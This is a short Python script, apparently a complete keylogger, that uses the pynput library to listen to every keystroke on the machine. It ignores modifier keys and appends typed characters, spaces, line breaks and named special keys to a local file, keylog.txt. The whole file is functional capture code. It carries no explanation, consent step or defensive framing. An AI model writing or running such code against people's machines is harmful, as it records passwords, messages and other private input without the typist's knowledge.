from pynput import keyboard

ignorar = {
    keyboard.Key.shift,
    keyboard.Key.shift_r, 
    keyboard.Key.shift_l,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.tab,
    keyboard.Key.caps_lock,
    keyboard.Key.backspace,
    keyboard.Key.right,
    keyboard.Key.cmd
    }

def on_press(key):
    try:
        if key not in ignorar:
            with open("keylog.txt", "a") as log_file:
                log_file.write(f"{key.char}")
    except AttributeError:
        if key == keyboard.Key.space:
            with open("keylog.txt", "a") as log_file:
                log_file.write(" ")
        elif key == keyboard.Key.enter:
            with open("keylog.txt", "a") as log_file:
                log_file.write("\n")
        else:
            with open("keylog.txt", "a") as log_file:
                log_file.write(f" [{key.name}] ")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

